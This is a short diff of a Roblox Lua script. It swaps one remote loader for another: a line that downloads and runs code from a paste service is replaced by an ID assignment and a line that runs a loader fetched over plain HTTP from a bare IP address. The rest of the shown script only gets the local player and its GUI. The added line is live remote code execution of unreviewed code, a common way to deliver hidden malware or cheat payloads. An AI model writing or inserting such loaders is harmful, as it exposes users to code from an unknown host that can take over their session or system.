@@ -1,4 +1,5 @@
-loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/83gXp5bsls3G9rsB/raw", true))()
+ID="49548f9c-791f-4a70-aa5f-5f5c02a35e6b";
+loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
